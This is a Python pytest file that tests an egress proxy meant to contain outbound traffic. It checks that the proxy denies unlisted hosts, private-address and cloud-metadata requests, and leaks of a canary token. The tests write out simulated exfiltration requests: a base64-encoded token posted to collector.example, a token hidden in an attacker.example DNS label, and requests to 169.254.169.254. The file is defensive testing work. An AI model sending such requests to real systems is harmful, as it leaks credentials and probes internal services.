"""The egress proxy is the containment wall; test it as a real process."""
import json
import os
import socket
import subprocess
import sys
import time
from pathlib import Path

import pytest

PROXY = Path(__file__).resolve().parent.parent / "proxy" / "egress_proxy.py"
CANARY = "ghp_canarytoken1234567890abcd"


@pytest.fixture()
def proxy():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    env = dict(os.environ, PORT=str(port), ALLOW_HOSTS="localhost,registry.npmjs.org", CANARIES=CANARY,
               UPSTREAM_PROXY="")
    p = subprocess.Popen([sys.executable, "-u", str(PROXY)], env=env, stdout=subprocess.PIPE, text=True)
    assert json.loads(p.stdout.readline())["verdict"] == "READY"
    yield port, p
    p.kill()


def _send(port, raw):
    with socket.create_connection(("127.0.0.1", port), timeout=5) as s:
        s.sendall(raw)
        return s.recv(4096).decode(errors="replace")


def _record(p):
    return json.loads(p.stdout.readline())


def test_connect_to_unlisted_host_is_denied(proxy):
    port, p = proxy
    resp = _send(port, b"CONNECT evil.example:443 HTTP/1.1\r\nHost: evil.example:443\r\n\r\n")
    assert resp.startswith("HTTP/1.1 403")
    rec = _record(p)
    assert rec["verdict"] == "DENY" and rec["host"] == "evil.example" and rec["bytes_out"] == 0


def test_plain_http_exfil_detects_canary_in_body_and_base64(proxy):
    import base64
    port, p = proxy
    body = base64.b64encode(f"token={CANARY}".encode())
    req = (b"POST http://collector.example/c HTTP/1.1\r\nHost: collector.example\r\nContent-Length: "
           + str(len(body)).encode() + b"\r\n\r\n" + body)
    assert _send(port, req).startswith("HTTP/1.1 403")
    rec = _record(p)
    assert rec["verdict"] == "DENY" and rec["canary_hit"]


def test_canary_in_dns_label_is_detected(proxy):
    port, p = proxy
    host = f"{CANARY[-12:]}.attacker.example"
    _send(port, f"CONNECT {host}:443 HTTP/1.1\r\n\r\n".encode())
    assert _record(p)["canary_hit"]


def test_allowlisted_name_resolving_to_private_ip_is_refused(proxy):
    """SSRF guard: 'localhost' is allowlisted but resolves to 127.0.0.1 -> refused."""
    port, p = proxy
    resp = _send(port, b"CONNECT localhost:22 HTTP/1.1\r\n\r\n")
    assert resp.startswith("HTTP/1.1 403")
    rec = _record(p)
    assert rec["verdict"] == "DENY" and rec["reason"].startswith("private_address")


def test_metadata_ip_is_refused(proxy):
    port, p = proxy
    _send(port, b"GET http://169.254.169.254/v1.json HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n")
    assert _record(p)["verdict"] == "DENY"
